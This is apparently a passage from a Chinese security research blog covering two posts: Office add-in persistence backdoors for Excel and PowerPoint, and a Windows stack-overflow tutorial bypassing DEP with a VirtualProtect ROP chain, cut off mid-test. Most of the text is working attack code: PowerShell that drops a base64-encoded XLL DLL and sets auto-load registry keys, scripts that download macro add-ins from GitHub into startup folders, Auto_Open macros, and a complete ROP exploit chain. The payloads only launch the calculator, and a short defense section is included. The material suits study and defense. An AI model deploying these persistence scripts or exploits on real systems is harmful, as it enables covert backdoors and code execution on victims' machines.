<p><code class="language-plaintext highlighter-rouge">$ExcelRegPath="HKCU:\Software\Microsoft\Office\"+$Ver+".0\Excel\"</code></p>

<p>新建键：Options</p>

<p><code class="language-plaintext highlighter-rouge">New-Item -type Directory $ExcelRegPath"Options" | Out-Null</code></p>

<p>新建字符串值： OPEN： /R calc.xll :</p>

<p><code class="language-plaintext highlighter-rouge">New-ItemProperty $ExcelRegPath"Options" OPEN -value "/R calc.xll" -propertyType string | Out-Null</code></p>

<p>完整代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$fileContent = "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ZGxsAHhsQXV0b09wZW4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY2FsYy5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA0AAAAAzAJMCowMjA4MEMwUDBYMGYwazBwMHUwgDCNMJcwrDC4ML4w4DDyME4xajEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$fileContentBytes = [System.Convert]::FromBase64String($fileContent) 
[System.IO.File]::WriteAllBytes($env:APPDATA+"\Microsoft\AddIns\calc.xll",$fileContentBytes)

Try  
{  
    $OfficeVersion=dir -name "C:\Program Files\Microsoft Office\Office*" -ErrorAction Stop  
    $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf("e")+1 ) 
    
}  
Catch  
{  
    Write-Host "[!] I can't find Microsoft Office!" 
    Write-Host "[+] Please reinput a correct path." 
    return 
}  
Write-Host "Microsoft Office Version:" $Ver
$ExcelRegPath="HKCU:\Software\Microsoft\Office\"+$Ver+".0\Excel\"
New-Item -type Directory $ExcelRegPath"Options" | Out-Null
New-ItemProperty $ExcelRegPath"Options" OPEN -value "/R calc.xll" -propertyType string | Out-Null
</code></pre></div></div>

<h2 id="0x04-excel-vba-add-ins">0x04 Excel VBA add-ins</h2>
<hr>

<h3 id="1手动测试-2">1、手动测试</h3>

<p>启动Excel，开启开发工具选项，选择Visual Basic</p>

<p>插入模块，写入以下代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sub Auto_Open()
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Exec ("calc.exe")
End Sub
</code></pre></div></div>

<p>保存为calc.xlam,路径为：</p>

<p><code class="language-plaintext highlighter-rouge">%appdata%\Microsoft\Excel\XLSTART</code></p>

<p>启动Excel.exe，弹出计算器，并且Excel正常启动</p>

<h3 id="2编写powershell脚本实现-2">2、编写Powershell脚本实现</h3>

<p>保存路径为：</p>

<p><code class="language-plaintext highlighter-rouge">%appdata%\Microsoft\Excel\XLSTART\calc.xlam</code></p>

<p>对应powershell代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$client = new-object System.Net.WebClient
$client.DownloadFile("https://raw.githubusercontent.com/3gstudent/Office-Persistence/master/calc.xlam",$env:APPDATA+"\Microsoft\Excel\XLSTART\calc.xlam")
</code></pre></div></div>

<h2 id="0x05-powerpoint-vba-add-ins">0x05 PowerPoint VBA add-ins</h2>
<hr>

<h3 id="1手动测试-3">1、手动测试</h3>

<p>启动PowerPoint，开启开发工具选项，选择Visual Basic</p>

<p>插入模块，写入以下代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sub Auto_Open()
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Exec ("calc.exe")
End Sub
</code></pre></div></div>

<p>保存为calc.ppa，路径为：</p>

<p><code class="language-plaintext highlighter-rouge">%appdata%\Microsoft\AddIns</code></p>

<p>查找注册表键值：</p>

<p>Office2010对应的键值为：</p>

<p><code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\PowerPoint</code></p>

<p>Office2013对应的键值为：</p>

<p><code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\PowerPoint</code></p>

<p>新建项AddIns，新建子项calc（对应calc.ppa）</p>

<p>新建<code class="language-plaintext highlighter-rouge">DWORD</code>值： <code class="language-plaintext highlighter-rouge">Autoload</code>： <code class="language-plaintext highlighter-rouge">1</code></p>

<p>新建<code class="language-plaintext highlighter-rouge">字符串</code>值： <code class="language-plaintext highlighter-rouge">Path</code>： <code class="language-plaintext highlighter-rouge">calc.ppa</code></p>

<p>启动PowerPoint.exe，弹出计算器，并且PowerPoint正常启动</p>

<h3 id="2编写powershell脚本实现-3">2、编写Powershell脚本实现</h3>

<p>保存路径为：</p>

<p><code class="language-plaintext highlighter-rouge">%appdata%\Microsoft\AddIns\calc.ppa</code></p>

<p>对应powershell代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$client = new-object System.Net.WebClient
$client.DownloadFile("https://raw.githubusercontent.com/3gstudent/Office-Persistence/master/calc.ppa",$env:APPDATA+"\Microsoft\AddIns\calc.ppa")
</code></pre></div></div>

<p>注册表路径：HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\PowerPoint\</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Try  
{  
    $OfficeVersion=dir -name "C:\Program Files\Microsoft Office\Office*" -ErrorAction Stop  
    $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf("e")+1 )     
}  
Catch  
{  
    Write-Host "[!] I can't find Microsoft Office!" 
    Write-Host "[+] Please reinput a correct path." 
    return 
}  
Write-Host "Microsoft Office Version:" $Ver
$ExcelRegPath="HKCU:\Software\Microsoft\Office\"+$Ver+".0\PowerPoint\"
</code></pre></div></div>

<p>新建键AddIns:</p>

<p><code class="language-plaintext highlighter-rouge">New-Item -type Directory $ExcelRegPath"AddIns" | Out-Null</code></p>

<p>新建键calc:</p>

<p><code class="language-plaintext highlighter-rouge">New-Item -type Directory $ExcelRegPath"AddIns\calc" | Out-Null</code></p>

<p>新建DWORD值： Autoload： 1</p>

<p><code class="language-plaintext highlighter-rouge">New-ItemProperty $ExcelRegPath"AddIns\calc" Autoload -value "1" -propertyType DWORD | Out-Null</code></p>

<p>新建字符串值： Path： calc.ppa</p>

<p><code class="language-plaintext highlighter-rouge">New-ItemProperty $ExcelRegPath"AddIns\calc" Path -value "calc.ppa" -propertyType string | Out-Null</code></p>

<p>完整代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$client = new-object System.Net.WebClient
$client.DownloadFile("https://raw.githubusercontent.com/3gstudent/Office-Persistence/master/calc.ppa",$env:APPDATA+"\Microsoft\AddIns\calc.ppa")

Try  
{  
    $OfficeVersion=dir -name "C:\Program Files\Microsoft Office\Office*" -ErrorAction Stop  
    $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf("e")+1 )     
}  
Catch  
{  
    Write-Host "[!] I can't find Microsoft Office!" 
    Write-Host "[+] Please reinput a correct path." 
    return 
}  
Write-Host "Microsoft Office Version:" $Ver
$ExcelRegPath="HKCU:\Software\Microsoft\Office\"+$Ver+".0\PowerPoint\"

New-Item -type Directory $ExcelRegPath"AddIns" | Out-Null
New-Item -type Directory $ExcelRegPath"AddIns\calc" | Out-Null
New-ItemProperty $ExcelRegPath"AddIns\calc" Autoload -value "1" -propertyType DWORD | Out-Null
New-ItemProperty $ExcelRegPath"AddIns\calc" Path -value "calc.ppa" -propertyType string | Out-Null
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>以上四种方法的利用脚本我已经整合并上传至github，地址为：</p>

<p>https://github.com/3gstudent/Office-Persistence</p>

<h2 id="0x06-检测和防御">0x06 检测和防御</h2>
<hr>

<h3 id="1word">1、Word</h3>

<p>禁用所有加载项，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-15/3-1.png" alt="Alt text"></p>

<p>禁用所有控件，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-15/3-2.png" alt="Alt text"></p>

<p>禁用所有宏，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-15/3-3.png" alt="Alt text"></p>

<p>Word WLL依然能够执行</p>

<p><strong>防御方法：</strong></p>

<p>删除信任位置：</p>

<p><code class="language-plaintext highlighter-rouge">C:\Users\a\AppData\Roaming\Microsoft\Word\Startup\</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-15/3-4.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>添加时不能使用环境变量%appdata%</p>

<h3 id="2excel">2、Excel</h3>

<p>Excel XLL和Excel VBA add-ins:</p>

<p><strong>防御方法：</strong></p>

<p>禁用所有加载项</p>

<h3 id="3powerpoint">3、PowerPoint</h3>

<p>PowerPoint VBA add-ins:</p>

<p><strong>防御方法：</strong></p>

<p>禁用所有加载项</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了x86系统下Word、Excel、PowerPoint中常用的四种后门利用方式，开源POC脚本以便于测试，最后站在防御角度，介绍了具体的防御方法。x64系统的利用方法作适当修改就好。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July 15, 2017
  </div>

  
</article><article class="post">
  <h1>Windows Shellcode学习笔记——通过VirtualProtect绕过DEP</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在掌握了栈溢出的基本原理和利用方法后，接下来就要研究如何绕过Windows系统对栈溢出利用的重重防护，所以测试环境也从xp转到了Win7(相比xp，Win7的防护更全面)。本文将要介绍经典的DEP绕过方法——通过VirtualProtect绕过DEP</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>VS2012的编译配置</li>
  <li>利用Immunity Debugger的mona插件自动获取ROP链</li>
  <li>对ROP链的分析调试</li>
  <li>调用VirtualProtect函数时的Bug及修复</li>
</ul>

<h2 id="0x02-相关概念">0x02 相关概念</h2>
<hr>

<p><strong>DEP:</strong></p>

<p>溢出攻击的根源在于计算机对数据和代码没有明确区分，如果将代码放置于数据段，那么系统就会去执行</p>

<p>为了弥补这一缺陷，微软从XP SP2开始支持数据执行保护(Data Exection Prevention)</p>

<p><strong>DEP保护原理:</strong></p>

<p>数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，而有了DEP，此时CPU会抛出异常，而不是去执行指令</p>

<p><strong>DEP四种工作状态:</strong></p>

<ul>
  <li>Optin</li>
  <li>Optout</li>
  <li>AlwaysOn</li>
  <li>AlwaysOff</li>
</ul>

<p><strong>DEP绕过原理:</strong></p>

<p>如果函数返回地址并不直接指向数据段，而是指向一个已存在的系统函数的入口地址，由于系统函数所在的页面权限是可执行的，这样就不会触发DEP</p>

<p>也就是说，可以在代码区找到替代指令实现shellcode的功能</p>

<p>但是可供利用的替代指令往往有限，无法完整的实现shellcode的功能</p>

<p>于是产生了一个折中方法：通过替代指令关闭DEP，再转入执行shellcode</p>

<p><strong>内存页:</strong></p>

<p>x86系统一个内存页的大小为4kb，即0x00001000,4096</p>

<p><strong>ROP:</strong></p>

<p>面向返回的编程(Return-oriented Programming)</p>

<p><strong>VirtualProtect:</strong></p>

<p>BOOL VirtualProtect{
	LPVOID	lpAddress,
	DWORD	dwsize,
	DWORD	flNewProtect,
	PDWORD	lpflOldProtect
}</p>

<p>lpAddress:内存起始地址
dwsize:内存区域大小
flNewProtect:内存属性，PAGE_EXECUTE_READWRITE(0x40)
lpflOldProtect:内存原始属性保存地址</p>

<p><strong>通过VirtualProtect绕过DEP:</strong></p>

<p>在内存中查找替代指令，填入合适的参数，调用VirtualProtect将shellcode的内存属性设置为可读可写可执行，然后跳到shellcode继续执行</p>

<h2 id="0x03-vs2012的编译配置">0x03 VS2012的编译配置</h2>
<hr>

<p><strong>测试环境：</strong></p>

<ul>
  <li>测试系统：	Win 7 x86</li>
  <li>编译器：	VS2012</li>
  <li>build版本：	Release</li>
</ul>

<p><strong>项目属性：</strong></p>

<ul>
  <li>关闭GS</li>
  <li>关闭优化</li>
  <li>关闭SEH</li>
  <li>关闭DEP</li>
  <li>关闭ASLR</li>
  <li>禁用c++异常</li>
  <li>禁用内部函数</li>
</ul>

<p><strong>具体配置方法：</strong></p>

<p>配置属性-c/c++-所有属性</p>

<ul>
  <li>安全检查 否(/GS-)</li>
  <li>启用c++异常 否</li>
  <li>启用内部函数 否</li>
  <li>优化 已禁用(/Od)</li>
</ul>

<p>配置属性-链接器-所有属性</p>

<ul>
  <li>数据执行保护(DEP) 否(/NXCOMPAT:NO)</li>
  <li>随机基址 否(/DYNAMICBASE:NO)</li>
  <li>映像具有安全异常处理程序 否(/SAFESEH:NO)</li>
</ul>

<h2 id="0x04-实际测试">0x04 实际测试</h2>
<hr>

<h3 id="测试1">测试1：</h3>

<p>测试代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>char shellcode[]=
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x42\x43\x44\x45";

void test()
{
	char buffer[48];
	memcpy(buffer,shellcode,sizeof(shellcode));
}

int main()
{
	printf("1\n");
	test();
	return 0;
}
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>strcpy在执行时遇到0x00会提前截断,为便于测试shellcode，将strcpy换成memcpy，遇到0x00不会被截断</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-10/2-1.png" alt="Alt text"></p>

<p>如上图，成功将返回地址覆盖为0x45444342</p>

<h3 id="测试2">测试2：</h3>

<p>shellcode起始地址为0x00403020</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PUSH 1  
POP ECX 
</code></pre></div></div>

<p>对应的机器码为<code class="language-plaintext highlighter-rouge">0x0059016A</code></p>

<p>将返回地址覆盖为shellcode起始地址</p>

<p>shellcode实现如下操作：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PUSH 1
POP ECX
</code></pre></div></div>

<p>其他位用0x90填充</p>

<p>c代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>char shellcode[]=
	"\x6A\x01\x59\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x20\x30\x40\x00";

void test()
{
	char buffer[48];
	memcpy(buffer,shellcode,sizeof(shellcode));
}

int main()
{
	printf("1\n");
	test();
	return 0;
}
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-10/2-2.png" alt="Alt text"></p>

<p>如上图，shellcode成功执行，ECX寄存器赋值为1</p>

<h3 id="测试3">测试3：</h3>

<p>开启DEP，再次调试，发现shellcode无法执行，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-10/2-3.png" alt="Alt text"></p>

<h3 id="测试4">测试4：</h3>

<p>下载安装Immunity Debugger</p>

<p>下载mona插件，下载地址如下：</p>

<p>https://github.com/corelan/mona</p>

<p>将mona.py放于C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands下</p>

<p>启动Immunity Debugger，打开test.exe</p>

<p>使用mona插件自动生成rop链，输入：</p>

<p><code class="language-plaintext highlighter-rouge">!mona rop -m *.dll -cp nonull</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-10/2-32.png" alt="Alt text"></p>

<p>mona会搜寻所有的DLL，用于构造rop链</p>

<p>执行命令后在C:\Program Files\Immunity Inc\Immunity Debugger下生成文件rop.txt、rop_chains.txt、rop_suggestions.txt、stackpivot.txt</p>

<p>查看rop_chains.txt，会列出可用来关闭DEP的ROP链，选择VirtualProtect()函数</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-10/2-4.png" alt="Alt text"></p>

<p>如上图，成功构建ROP链</p>

<p><strong>注：</strong></p>

<p>不同环境有可能无法获得完整参数，需要具体环境具体分析</p>

<p>对应的测试poc修改如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned int shellcode[]=
{     
      0x90909090,0x90909090,0x90909090,0x90909090,
      0x90909090,0x90909090,0x90909090,0x90909090,
	  0x90909090,0x90909090,0x90909090,0x90909090,
	  0x90909090,
      0x77217edd,  // POP EAX // RETN [kernel32.dll] 
      0x77171910,  // ptr to &amp;VirtualProtect() [IAT kernel32.dll]
      0x75d7e9dd,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [KERNELBASE.dll] 
      0x779f9dca,  // XCHG EAX,ESI // RETN [ntdll.dll] 
      0x779cdd30,  // POP EBP // RETN [ntdll.dll] 
      0x75dac58d,  // &amp; call esp [KERNELBASE.dll]
      0x693a7031,  // POP EAX // RETN [MSVCR110.dll] 
      0xfffffdff,  // Value to negate, will become 0x00000201
      0x69354484,  // NEG EAX // RETN [MSVCR110.dll] 
      0x75da655d,  // XCHG EAX,EBX // ADD BH,CH // DEC ECX // RETN 0x10 [KERNELBASE.dll] 
      0x69329bb1,  // POP EAX // RETN [MSVCR110.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x69354484,  // NEG EAX // RETN [MSVCR110.dll] 
      0x771abd3a,  // XCHG EAX,EDX // RETN [kernel32.dll] 
      0x6935a7c0,  // POP ECX // RETN [MSVCR110.dll] 
      0x693be00d,  // &amp;Writable location [MSVCR110.dll]
      0x779a4b9a,  // POP EDI // RETN [ntdll.dll] 
      0x69354486,  // RETN (ROP NOP) [MSVCR110.dll]
      0x693417cb,  // POP EAX // RETN [MSVCR110.dll] 
      0x90909090,  // nop
      0x69390267,  // PUSHAD // RETN [MSVCR110.dll] 
	  	
      0x9059016A,  //PUSH 1  // POP ECX // NOP
      0x90909090,
      0x90909090,
      0x90909090,
      0x90909090
};
void test()
{
	char buffer[48];	
	printf("3\n");
	memcpy(buffer,shellcode,sizeof(shellcode));
}
int main()
{
	printf("1\n");
	test();
	return 0;
}
</code></pre></div></div>

<p>其中0x9059016A为<code class="language-plaintext highlighter-rouge">PUSH 1;POP ECX;NOP;</code>的机器码，如果绕过DEP，该指令将会成功执行</p>

<p>编译后在OllyDbg中调试</p>

<p>单步跟踪到CALL KERNELBA.VirtualProtectEX，查看堆栈</p>

<p>可获得传入的函数参数</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-10/2-5.png" alt="Alt text"></p>

<p>如上图，不巧的是shellcode覆盖了SEH链</p>

<p>这样会导致传入VirtualProtectEX函数的参数不正确，调用失败，猜测调用VirtualProtectEX函数的返回值为0</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-10/2-6.png" alt="Alt text"></p>

<p>如上图，验证上面的判断，EAX寄存器表示返回值，返回值为0，修改内存属性失败</p>

<p><strong>解决思路：</strong></p>

<p>我们需要扩大栈空间，将SEH链下移，确保shellcode不会覆盖到SEH链</p>

<p><strong>解决方法：</strong></p>

<p>修改源代码，通过申请空间的方式下移SEH链</p>

<h3 id="测试5">测试5：</h3>

<p>关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int main()
{
	printf("1\n");
	test();
	char Buf[] = 
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	return 0;
}
</code></pre></div></div>

<p>编译程序，再次放在OllyDbg中调试</p>

<p>单步跟踪到CALL KERNELBA.VirtualProtectEX，查看堆栈</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-10/2-7.png" alt="Alt text"></p>

<p>SEH链成功“下移”，位于高地址，未被shellcode覆盖</p>

<p>此时传入VirtualProtectEX函数的参数正确</p>

<p>按F8单步执行，查看结果</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-10/2-8.png" alt="Alt text"></p>

<p>如上图，返回值为0，修改内存属性仍失败</p>

<p>LastErr显示错误为ERRPR_INVALID_ADDRESS（000001E7），表示地址错误</p>

<h3 id="测试6">测试6：</h3>

<p>查看正常调用函数VirtualProtect()时的堆栈，对比测试5，分析失败原因</p>

<p>正常调用的实现代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int main()
{

	void *p=malloc(16);
	printf("0x%08x\n",p);
	DWORD pflOldProtect;
	int x=VirtualProtect(p,4,0x40,&amp;pflOldProtect);
	printf("%d\n",x);
	return 0;
}
</code></pre></div></div>

<h3 id="测试7">测试7：</h3>

<p>如果将起始地址修改为一个不能访问的地址，如0x40303020</p>

<p>编译程序，放在OllyDbg中调试</p>

<p>单步跟踪到CALL KERNELBA.VirtualProtectEX，查看堆栈</p>

<p>格式如图</p>

